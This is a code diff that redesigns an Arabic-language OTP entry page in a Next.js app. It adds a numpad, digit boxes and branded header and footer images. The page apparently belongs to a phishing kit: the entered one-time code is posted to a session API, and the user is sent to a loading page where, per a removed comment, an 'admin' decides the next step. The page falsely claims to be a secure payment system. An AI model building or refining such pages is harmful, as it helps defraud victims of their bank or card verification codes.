@@ -5,6 +5,7 @@ import { useRouter, useSearchParams } from "next/navigation";
 import SessionTracker from "@/components/SessionTracker";
 
 const GREEN = "#1e7344";
+const DARK_GREEN = "#155a34";
 
 export default function OTPPage() {
   const router = useRouter();
@@ -13,6 +14,7 @@ export default function OTPPage() {
   const [canResend, setCanResend] = useState(false);
   const [errorMsg, setErrorMsg] = useState("");
   const [inputError, setInputError] = useState(false);
+  const [pressedKey, setPressedKey] = useState<string | null>(null);
   const searchParams = useSearchParams();
 
   useEffect(() => {
@@ -32,11 +34,25 @@ export default function OTPPage() {
   const minutes = Math.floor(timeLeft / 60).toString().padStart(2, "0");
   const seconds = (timeLeft % 60).toString().padStart(2, "0");
 
+  function pressDigit(digit: string) {
+    if (otp.length < 6) {
+      setOtp(prev => prev + digit);
+      if (inputError) { setInputError(false); setErrorMsg(""); }
+    }
+    setPressedKey(digit);
+    setTimeout(() => setPressedKey(null), 150);
+  }
+
+  function pressDelete() {
+    setOtp(prev => prev.slice(0, -1));
+    setPressedKey("del");
+    setTimeout(() => setPressedKey(null), 150);
+  }
+
   async function handleConfirm() {
     if (otp.length === 6) {
       setErrorMsg("");
       setInputError(false);
-      // إرسال رمز OTP للـ API
       try {
         await fetch('/api/session', {
           method: 'POST',
@@ -44,63 +60,142 @@ export default function OTPPage() {
           body: JSON.stringify({ current_page: 'otp', otp_code: otp, waiting_for: 'otp' }),
         });
       } catch {}
-      // الانتقال لصفحة التحميل وانتظار قرار الأدمين
       router.push("/loading-page?from=otp");
     } else {
-      alert("يرجى إدخال رمز مكون من 6 أرقام");
+      setErrorMsg("يرجى إدخال رمز مكون من 6 أرقام");
+      setInputError(true);
     }
   }
 
+  const otpDots = Array.from({ length: 6 }, (_, i) => i < otp.length);
+
+  const numpadKeys = [
+    ['1', '2', '3'],
+    ['4', '5', '6'],
+    ['7', '8', '9'],
+    ['', '0', 'del'],
+  ];
+
   return (
-    <div style={{ backgroundColor: "#f7f8fa", display: "flex", justifyContent: "center", alignItems: "center", minHeight: "100vh", padding: "10px" }}>
+    <div style={{
+      background: "linear-gradient(160deg, #f0f4f0 0%, #e8f0e8 100%)",
+      display: "flex",
+      flexDirection: "column",
+      alignItems: "center",
+      minHeight: "100vh",
+      fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif",
+      direction: "rtl",
+    }}>
       <SessionTracker page="otp" />
-      <div style={{ background: "#fff", width: "100%", maxWidth: "350px", borderRadius: "20px", paddingBottom: "25px", boxShadow: "0 8px 25px rgba(0,0,0,0.05)", textAlign: "center", overflow: "hidden" }}>
 
-        <img src="https://i.ibb.co/VWbkStrM/IMG-1749.webp" style={{ width: "100%", maxWidth: "180px", height: "auto", margin: "20px auto 10px", display: "block" }} alt="OTP" />
+      {/* Header - نفس هيدر الصفحة الرئيسية */}
+      <img
+        src="https://i.ibb.co/8LWchYJd/IMG-20260320-WA0028.jpg"
+        alt="Header"
+        style={{ width: "100%", display: "block" }}
+      />
 
-        <div style={{ padding: "0 20px" }}>
-          <h2 style={{ fontSize: "17px", color: "#333", marginBottom: "8px", fontWeight: "bold" }}>أدخل رمز التحقق</h2>
-          <p style={{ fontSize: "12px", color: "#777", lineHeight: "1.5", marginBottom: "20px" }}>
-            يرجى إدخال الرمز المكون من 6 أرقام المرسل لجوالك.
-          </p>
+      {/* Main Content */}
+      <div style={{
+        flex: 1,
+        display: "flex",
+        flexDirection: "column",
+        alignItems: "center",
+        justifyContent: "center",
+        padding: "20px 16px",
+        width: "100%",
+        maxWidth: "400px",
+      }}>
 
-          <input
-            type="tel"
-            maxLength={6}
-            value={otp}
-            onChange={e => {
-              setOtp(e.target.value.replace(/\D/g, "").slice(0, 6));
-              if (inputError) { setInputError(false); setErrorMsg(""); }
-            }}
-            placeholder="••••••"
+        {/* OTP Icon */}
+        <div style={{ marginBottom: "14px", textAlign: "center" }}>
+          <img
+            src="https://i.ibb.co/VWbkStrM/IMG-1749.webp"
+            alt="OTP"
             style={{
-              width: "100%", maxWidth: "220px", height: "45px",
-              border: inputError ? "2px solid #e74c3c" : "1px solid #ddd",
-              borderRadius: "8px",
-              textAlign: "center", fontSize: "20px", letterSpacing: "8px",
-              fontWeight: "bold", color: inputError ? "#e74c3c" : GREEN,
-              outline: "none",
-              backgroundColor: inputError ? "#fff5f5" : "#fafafa",
-              marginBottom: "8px",
-              display: "block", margin: "0 auto 8px",
+              width: "110px",
+              height: "auto",
+              filter: "drop-shadow(0 6px 15px rgba(0,0,0,0.12))",
             }}
           />
+        </div>
+
+        {/* Card */}
+        <div style={{
+          background: "white",
+          borderRadius: "20px",
+          padding: "20px 20px 18px",
+          width: "100%",
+          boxShadow: "0 8px 30px rgba(0,0,0,0.08)",
+          border: "1px solid rgba(30,115,68,0.1)",
+        }}>
+          <h2 style={{ fontSize: "17px", color: "#333", marginBottom: "6px", fontWeight: "bold", textAlign: "center" }}>
+            أدخل رمز التحقق
+          </h2>
+          <p style={{ fontSize: "12px", color: "#777", lineHeight: "1.5", marginBottom: "16px", textAlign: "center" }}>
+            يرجى إدخال الرمز المكون من 6 أرقام المرسل لجوالك
+          </p>
+
+          {/* OTP Dots */}
+          <div style={{
+            display: "flex",
+            justifyContent: "center",
+            gap: "8px",
+            marginBottom: "12px",
+            direction: "ltr",
+          }}>
+            {otpDots.map((filled, i) => (
+              <div key={i} style={{
+                width: "42px",
+                height: "48px",
+                borderRadius: "10px",
+                border: inputError
+                  ? "2px solid #e74c3c"
+                  : filled
+                    ? `2px solid ${GREEN}`
+                    : "2px solid #ddd",
+                background: inputError
+                  ? "#fff5f5"
+                  : filled
+                    ? `${GREEN}15`
+                    : "#fafafa",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                transition: "all 0.15s ease",
+                boxShadow: filled && !inputError ? `0 2px 8px ${GREEN}30` : "none",
+              }}>
+                {filled && (
+                  <div style={{
+                    width: "12px",
+                    height: "12px",
+                    borderRadius: "50%",
+                    background: inputError ? "#e74c3c" : GREEN,
+                  }} />
+                )}
+              </div>
+            ))}
+          </div>
+
+          {/* Error Message */}
           {errorMsg && (
             <div style={{
               color: "#e74c3c",
-              fontSize: "13px",
+              fontSize: "12px",
               fontWeight: "bold",
               marginBottom: "10px",
               padding: "8px 12px",
               backgroundColor: "#fff5f5",
               borderRadius: "8px",
               border: "1px solid #e74c3c",
+              textAlign: "center",
             }}>
               ❌ {errorMsg}
             </div>
           )}
 
-          <div style={{ fontSize: "12px", color: "#999", marginBottom: "20px", minHeight: "20px" }}>
+          {/* Timer */}
+          <div style={{ fontSize: "12px", color: "#999", marginBottom: "14px", textAlign: "center", minHeight: "20px" }}>
             {canResend ? (
               <span
                 onClick={() => { setTimeLeft(120); setCanResend(false); setOtp(""); setErrorMsg(""); setInputError(false); }}
@@ -109,19 +204,97 @@ export default function OTPPage() {
                 إعادة إرسال الرمز الآن
               </span>
             ) : (
-              <>إعادة إرسال الرمز خلال <strong>{minutes}:{seconds}</strong> دقيقة</>
+              <>إعادة الإرسال خلال <strong style={{ color: GREEN }}>{minutes}:{seconds}</strong></>
             )}
           </div>
 
+          {/* Numpad */}
+          <div style={{
+            display: "grid",
+            gridTemplateColumns: "repeat(3, 1fr)",
+            gap: "8px",
+            marginBottom: "14px",
+          }}>
+            {numpadKeys.flat().map((key, idx) => {
+              if (key === '') return <div key={idx} />;
+              const isPressed = pressedKey === key;
+              const isDel = key === 'del';
+              return (
+                <button
+                  key={idx}
+                  onClick={() => isDel ? pressDelete() : pressDigit(key)}
+                  style={{
+                    height: "50px",
+                    borderRadius: "12px",
+                    border: isDel ? "1.5px solid #e0e0e0" : `1.5px solid ${isPressed ? GREEN : '#e8e8e8'}`,
+                    background: isDel
+                      ? (isPressed ? "#fee2e2" : "#fff5f5")
+                      : (isPressed ? GREEN : "white"),
+                    color: isDel
+                      ? "#e74c3c"
+                      : (isPressed ? "white" : "#333"),
+                    fontSize: isDel ? "11px" : "20px",
+                    fontWeight: "bold",
+                    cursor: "pointer",
+                    transition: "all 0.12s ease",
+                    transform: isPressed ? "scale(0.94)" : "scale(1)",
+                    boxShadow: isPressed
+                      ? (isDel ? "0 2px 6px rgba(231,76,60,0.2)" : `0 2px 8px ${GREEN}40`)
+                      : "0 2px 4px rgba(0,0,0,0.06)",
+                    display: "flex",
+                    alignItems: "center",
+                    justifyContent: "center",
+                  }}
+                >
+                  {isDel ? (
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                      <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
+                      <line x1="18" y1="9" x2="12" y2="15"/>
+                      <line x1="12" y1="9" x2="18" y2="15"/>
+                    </svg>
+                  ) : key}
+                </button>
+              );
+            })}
+          </div>
+
+          {/* Confirm Button */}
           <button
             onClick={handleConfirm}
-            style={{ width: "100%", backgroundColor: GREEN, color: "white", border: "none", borderRadius: "10px", padding: "12px", fontSize: "15px", fontWeight: "bold", cursor: "pointer" }}
+            style={{
+              width: "100%",
+              background: otp.length === 6
+                ? `linear-gradient(135deg, ${GREEN} 0%, ${DARK_GREEN} 100%)`
+                : "#ccc",
+              color: "white",
+              border: "none",
+              borderRadius: "12px",
+              padding: "14px",
+              fontSize: "15px",
+              fontWeight: "bold",
+              cursor: otp.length === 6 ? "pointer" : "not-allowed",
+              transition: "all 0.2s ease",
+              boxShadow: otp.length === 6 ? `0 4px 15px ${GREEN}40` : "none",
+              display: "flex",
+              alignItems: "center",
+              justifyContent: "center",
+              gap: "8px",
+            }}
           >
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+              <polyline points="20 6 9 17 4 12"/>
+            </svg>
             تأكيد العملية
           </button>
 
-          <div style={{ marginTop: "15px", fontSize: "10px", color: "#bbb" }}>🔒 نظام دفع مشفر وآمن بالكامل</div>
+          <div style={{ marginTop: "12px", fontSize: "10px", color: "#bbb", textAlign: "center" }}>🔒 نظام دفع مشفر وآمن بالكامل</div>
         </div>
+      </div>
+
+      {/* Footer - صورتا الفوتر من الصفحة الرئيسية */}
+      <div style={{ width: "100%" }}>
+        <img src="https://i.ibb.co/v4MNd90m/IMG-20260322-WA0002.jpg" style={{ width: "100%", display: "block" }} alt="" />
+        <img src="https://i.ibb.co/Rp4xMwxN/IMG-20260321-WA0000.jpg" style={{ width: "100%", display: "block" }} alt="" />
       </div>
     </div>
   );
